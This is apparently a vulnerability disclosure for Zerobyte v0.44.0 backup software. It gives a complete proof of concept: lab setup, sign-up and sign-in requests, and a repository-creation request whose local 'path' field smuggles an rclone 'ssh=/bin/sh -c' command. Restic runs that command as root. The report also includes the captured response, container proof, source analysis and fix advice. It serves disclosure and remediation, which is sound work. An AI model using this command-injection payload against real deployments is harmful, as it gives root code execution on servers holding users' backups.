### Vulnerability details

**Official website / Product:** https://zerobyte.app / https://github.com/nicotsx/zerobyte

**Repository:** https://github.com/nicotsx/zerobyte (stars at selection: 7097)

**Vulnerability type:** RCE (incomplete #1253 control bypass: `backend=local` `path` → restic `rclone::` connection-string / custom `ssh` binary)

**Vulnerability versions:** v0.44.0 (`ghcr.io/nicotsx/zerobyte:v0.44.0`; audited source commit `c93130c591d99e0c01a08ad8c89677bf85614cb4`, tag `v0.44.0` → `a1b6d0cd623312d4e3be3216c643d8f6943270b9`)

**Vulnerability URL / Parameter:** Authenticated `POST /api/v1/repositories` JSON `config.backend=local`, `config.path` (restic `--repo` URL), `config.isExistingRepository=true`

**Complex:** yes

### Verification procedure

1. Lab: original `labs/zerobyte-r29-a6/` was removed by hygiene. Recreate with the compose below (`ghcr.io/nicotsx/zerobyte:v0.44.0`, host port **20906** → container `4096`). Do **not** mount `rclone.conf` (so `capabilities.rclone=false`, matching verify).

```yaml
# compose.yaml (reconstructable lab)
services:
  zerobyte:
    image: ghcr.io/nicotsx/zerobyte:v0.44.0
    container_name: zerobyte-r29-a6
    restart: unless-stopped
    cap_add:
      - SYS_ADMIN
    ports:
      - "20906:4096"
    devices:
      - /dev/fuse:/dev/fuse
    environment:
      - TZ=UTC
      - BASE_URL=http://127.0.0.1:20906
      - APP_SECRET=94bad4678ce84a60b9789bd2114a6bf780aeb38df426f7352c941c66e25d5c2b
    volumes:
      - zerobyte-data:/var/lib/zerobyte

volumes:
  zerobyte-data:
```

```bash
docker compose up -d
# wait until Listening on http://localhost:4096/ ; host URL http://127.0.0.1:20906
```

2. Bootstrap (first boot only): register the first admin via better-auth, then download the recovery key (required before repository ops). Lab account used at verify: email `admin@example.com`, name/username `admin`, password `Admin123!r29a6` (fresh instance: use the same or replace cookies below after your own signup/sign-in).

3. `POST /api/v1/repositories` with `backend=local` and `path` set to a restic rclone on-the-fly URL, e.g. `rclone::sftp,ssh=/bin/sh -c "id > /tmp/zb-r29a6-rce; echo R29A6-PWNED >> /tmp/zb-r29a6-rce":/tmp`, plus `isExistingRepository=true` so Zerobyte does not append a shortId subdirectory and immediately runs `restic snapshots`.

4. PR #1253 / `rcloneRemoteNameSchema` only validates the dedicated rclone backend’s `remote` name. `buildRepoUrl` for `local` returns `config.path` unchanged, so restic receives `--repo rclone::sftp,ssh=...` and invokes bundled `/usr/local/bin/rclone`, which executes the attacker-controlled `ssh` SpaceSepList (`/bin/sh -c "..."`).

5. Inside the container, `/tmp/zb-r29a6-rce` contains `uid=0(root)` and `R29A6-PWNED`. The HTTP API returns 500 because SFTP handshake fails after the command runs — the side effect is the RCE. System info still reports `capabilities.rclone=false` (no rclone.conf), proving the UI capability gate does not block this path.

### Complete vulnerability PoC

#### 0a. First-user sign-up (fresh instance)

Complete HTTP request (lab bootstrap; better-auth email signup):

```http
POST /api/auth/sign-up/email HTTP/1.1
Host: 127.0.0.1:20906
Accept: application/json
Content-Type: application/json
Origin: http://127.0.0.1:20906
Content-Length: 97
Connection: close

{"email":"admin@example.com","password":"Admin123!r29a6","name":"admin","username":"admin"}
```

Expect HTTP 200 and a `Set-Cookie: zerobyte.session_token=...`. First user becomes org admin. If the instance already has an admin, use sign-in instead (0b).

#### 0b. Sign-in (reuse existing admin)

Complete HTTP request:

```http
POST /api/auth/sign-in/email HTTP/1.1
Host: 127.0.0.1:20906
Accept: application/json
Content-Type: application/json
Origin: http://127.0.0.1:20906
Content-Length: 64
Connection: close

{"email":"admin@example.com","password":"Admin123!r29a6"}
```

Complete HTTP response body captured at verify (session cookie also set via `Set-Cookie`; replace the Cookie value in later steps with yours):

```json
{"redirect":false,"token":"Z2A6amjlj8vE7WiKD2pFhljn7OebRprt","user":{"name":"admin","email":"admin@example.com","emailVerified":false,"image":null,"createdAt":"2026-11-01T23:05:17.468Z","updatedAt":"2026-11-01T23:05:40.903Z","username":"01a1995c-2d9d-76e6-ad9a-b7378a7761d9","displayUsername":null,"role":"admin","banned":false,"banReason":null,"banExpires":null,"twoFactorEnabled":false,"hasDownloadedResticPassword":true,"dateFormat":"MM/DD/YYYY","timeFormat":"12h","id":"cu2RXwIYLDMNXC6jTPUWFTtUlqwHOtFO"}}
```

#### 0c. Download recovery key (required once before repository create)

Complete HTTP request (account password in JSON body):

```http
POST /api/v1/system/restic-password HTTP/1.1
Host: 127.0.0.1:20906
Accept: application/json
Content-Type: application/json
Cookie: zerobyte.session_token=<SESSION_FROM_SIGNUP_OR_SIGNIN>
Origin: http://127.0.0.1:20906
Content-Length: 32
Connection: close

{"password":"Admin123!r29a6"}
```

Expect HTTP 200 with a 64-char restic recovery key body (`restic.pass`). Skip if `hasDownloadedResticPassword` is already `true`.

#### 1. Trigger RCE via local-path rclone:: smuggle

Prerequisite — session cookie from 0a/0b (Docker-verified cookie retained below for packet fidelity; replace on rebuild). Trigger HTTP request (Docker-verified):

```http
POST /api/v1/repositories HTTP/1.1
Host: 127.0.0.1:20906
User-Agent: r29-a6-zerobyte-poc
Accept: application/json
Content-Type: application/json
Cookie: zerobyte.session_token=Z2A6amjlj8vE7WiKD2pFhljn7OebRprt.V%2By4Vx0tDyapF4MHyWV%2B4Ed4gEI8gD2u61YpJIko9lo%3D
Origin: http://127.0.0.1:20906
Content-Length: 191
Connection: close

{"name":"rce-path-bypass","config":{"backend":"local","path":"rclone::sftp,ssh=/bin/sh -c \"id > /tmp/zb-r29a6-rce; echo R29A6-PWNED >> /tmp/zb-r29a6-rce\":/tmp","isExistingRepository":true}}
```

Complete HTTP response (raw Docker-lab response; 500 is expected after command execution / failed SFTP handshake):

```http
HTTP/1.1 500 Internal Server Error
Access-Control-Allow-Origin: http://127.0.0.1:20906
Content-Type: application/json
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 0
Vary: Origin
Origin-Agent-Cluster: ?1
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Date: Sun, 01 Nov 2026 23:10:42 GMT
Content-Length: 1004
Connection: close

{"message":"Failed to initialize repository: Restic snapshots retrieval failed: rclone: 2026/11/01 23:10:31 NOTICE: Config file \"/root/.config/rclone/rclone.conf\" not found - using defaults\nrclone: 2026/11/01 23:10:31 NOTICE: :sftp{8J9DK}: No host key validation is being performed. Set known_hosts_file (to \"none\" to silence this notice) or use --sftp-pin-host-key to enable it. See: https://rclone.org/sftp/#host-key-validation\nrclone: 2026/11/01 23:10:42 CRITICAL: Failed to create file system for \":sftp,ssh=/bin/sh -c \\\"id > /tmp/zb-r29a6-rce; echo R29A6-PWNED >> /tmp/zb-r29a6-rce\\\":/tmp\": NewFs: couldn't initialise SFTP: error receiving version packet from server: server unexpectedly closed connection: unexpected EOF\n{\"message_type\":\"exit_error\",\"code\":1,\"message\":\"Fatal: unable to open repository at rclone::sftp,ssh=/bin/sh -c \\\"id \\u003e /tmp/zb-r29a6-rce; echo R29A6-PWNED \\u003e\\u003e /tmp/zb-r29a6-rce\\\":/tmp: error talking HTTP to rclone: exit status 1\"}"}
```

Proof from container (`docker exec zerobyte-r29-a6 cat /tmp/zb-r29a6-rce`):

```text
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
R29A6-PWNED
```

Verification result notes:

- Response body quotes the attacker `rclone::sftp,ssh=/bin/sh -c "..."` repository URL, proving restic/rclone received the connection string.
- Container file `/tmp/zb-r29a6-rce` contains:
  - `uid=0(root) gid=0(root) groups=0(root),...`
  - `R29A6-PWNED`
- Impact: authenticated org admin/operator obtains **root RCE** inside the official Zerobyte Docker image by bypassing the post-#1253 rclone remote-name allowlist via the local repository path field.

### Vulnerability analysis

Commit `6cc4d24` (`fix(rclone): constrain backend references`, PR #1253) introduced `rcloneRemoteNameSchema` and applied it to the **rclone** repository/volume `remote` field and config-import, explicitly rejecting payloads such as `:sftp,ssh=/bin/sh` and `remote,ssh=/bin/sh`. That control is incomplete: `localRepositoryConfigSchema` still accepts any non-empty `path`, and `buildRepoUrl` for `backend === "local"` returns that string verbatim as the restic `--repo` argument. Restic treats any `rclone:` / `rclone::` prefix as the rclone backend, including on-the-fly connection strings where rclone’s sftp `ssh` option is a SpaceSepList that can be set to `/bin/sh -c "<cmd>"`. Creating a repository with `isExistingRepository: true` triggers `restic.snapshots` immediately, executing the payload. This is command injection / backend-confusion beyond intended argument-based local-path usage, and it works even when `GET /api/v1/system/info` reports `capabilities.rclone: false`.

Trigger / sink source (full path and line numbers):

```typescript
# File: packages/core/src/restic/helpers/rclone-remote.ts
# Lines: 1-12
import { z } from "zod";

const rcloneRemoteNamePattern = /^[\p{L}\p{N}_.+@](?:[\p{L}\p{N}_.+@ -]*[\p{L}\p{N}_.+@-])?$/u;

export const rcloneRemoteNameSchema = z
	.string()
	.regex(rcloneRemoteNamePattern, "Rclone remote must be a configured remote name");

export const buildRcloneRemotePath = (remote: string, path: string) => {
	const name = rcloneRemoteNameSchema.parse(remote);
	return `${name}:${path}`;
};
```

```typescript
# File: packages/core/src/restic/schemas.ts
# Lines: 64-96
export const localRepositoryConfigSchema = z
	.object({
		backend: z.literal("local"),
		path: z.string().min(1),
	})
	.extend(baseRepositoryConfigSchema.shape);

export const rcloneRepositoryConfigSchema = z
	.object({
		backend: z.literal("rclone"),
		remote: rcloneRemoteNameSchema,
		path: z.string().min(1),
	})
	.extend(baseRepositoryConfigSchema.shape);
```

```typescript
# File: packages/core/src/restic/helpers/build-repo-url.ts
# Lines: 4-30
export const buildRepoUrl = (config: RepositoryConfig): string => {
	switch (config.backend) {
		case "local":
			return config.path;
		// ...
		case "rclone":
			return `rclone:${buildRcloneRemotePath(config.remote, config.path)}`;
		// ...
		case "sftp":
			return `sftp:${config.user}@${config.host}:${config.path}`;
```

```typescript
# File: app/server/modules/repositories/repositories.service.ts
# Lines: 153-186
if (config.backend === "local" && !config.isExistingRepository) {
	config.path = `${config.path}/${shortId}`;
}
// ...
if (config.isExistingRepository) {
	const result = await runEffectPromise(restic.snapshots(encryptedConfig, { organizationId }))
		.then(() => ({ error: null }))
		.catch((error) => ({ error }));
	error = result.error;
}
```

### Fix notes

- Reject local (and any non-rclone) repository `path` / URL values that match restic remote URL schemes (`rclone:`, `sftp:`, `s3:`, `rest:`, `gs:`, `azure:`, etc.), or require local paths to be absolute filesystem paths under an allowlisted root.
- Apply the same `rcloneRemoteNameSchema` (or stricter URL parsing) whenever a user-controlled string becomes restic `--repo`.
- Consider disabling on-the-fly rclone connection strings entirely (`rclone::backend,...`) unless explicitly enabled with a safe allowlist.

